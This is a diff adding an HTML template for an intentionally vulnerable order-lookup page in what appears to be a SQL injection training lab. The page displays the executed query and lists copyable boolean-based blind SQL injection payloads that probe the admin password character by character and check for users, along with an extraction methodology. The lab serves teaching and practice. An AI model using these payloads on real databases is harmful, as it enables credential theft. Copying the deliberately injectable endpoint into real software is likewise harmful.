@@ -1,0 +1,78 @@
+{% extends "base.html" %}
+
+{% block title %}Check Order - SQL Injection Lab{% endblock %}
+
+{% block content %}
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">📦 Order Lookup</span>
+        <span class="badge badge-danger">Vulnerable: Boolean-Based Blind SQLi</span>
+    </div>
+    <p style="color: var(--text-muted); font-size: 14px; margin-bottom: 20px;">
+        This endpoint is vulnerable to <strong>Boolean-Based Blind SQL Injection</strong>.
+        The page content changes based on whether the query returns results (True) or not (False).
+    </p>
+    <form method="GET" action="{{ url_for('check_order') }}">
+        <div style="display: flex; gap: 12px;">
+            <input type="text" name="id" value="{{ order_id }}" placeholder="Order ID..." style="flex: 1;">
+            <button type="submit" class="btn btn-primary">Check</button>
+        </div>
+    </form>
+    {% if executed_query %}
+    <div class="query-box">
+        <span class="label">Executed SQL Query</span>
+        <code>{{ executed_query }}</code>
+    </div>
+    {% endif %}
+    {% if error %}
+        <div class="alert alert-danger">{{ error }}</div>
+    {% endif %}
+    {% if result %}
+        <div class="alert alert-success">
+            <strong>✅ Order Found!</strong> 
+            Order #{{ result.id }} — Product ID: {{ result.product_id }}, Qty: {{ result.quantity }}, 
+            Total: ${{ result.total_price }}, Status: {{ result.status }}
+        </div>
+    {% elif order_id and not error %}
+        <div class="alert alert-danger">
+            <strong>❌ Order Not Found</strong> — No order matches the provided criteria.
+        </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <span class="card-title">💉 Boolean-Based Blind SQLi Payloads</span>
+        <span class="badge badge-warning">Click to copy</span>
+    </div>
+    <div class="payload">
+        <div class="payload-label">Check if admin password starts with 'a' (True = order found, False = not found)</div>
+        1 AND (SELECT CASE WHEN (substr((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN 1 ELSE 1/0 END)=1
+    </div>
+    <div class="payload">
+        <div class="payload-label">Check password length > 5</div>
+        1 AND (SELECT length(password) FROM users WHERE username='admin') > 5
+    </div>
+    <div class="payload">
+        <div class="payload-label">Check if user 'alice' exists</div>
+        1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE username='alice') > 0 THEN 1 ELSE 1/0 END)=1
+    </div>
+    <div class="payload">
+        <div class="payload-label">Check if any admin users exist</div>
+        1 AND (SELECT CASE WHEN (SELECT count(*) FROM users WHERE role='admin') > 0 THEN 1 ELSE 1/0 END)=1
+    </div>
+</div>
+
+<div class="card" style="border-color: var(--info);">
+    <div class="card-header">
+        <span class="card-title" style="color: var(--info);">🔬 Testing Methodology</span>
+    </div>
+    <ol style="padding-left: 20px; color: var(--text-muted); font-size: 13px; line-height: 1.8;">
+        <li>Start with a valid order ID (1-15) to establish baseline True response</li>
+        <li>Modify the ID with AND conditions to ask True/False questions</li>
+        <li>If query returns order → condition is True; if empty → False (or error)</li>
+        <li>Use <code>substr()</code> and <code>length()</code> to extract data character by character</li>
+        <li>Automate with a script (see /docs for Python example)</li>
+    </ol>
+</div>
+{% endblock %}
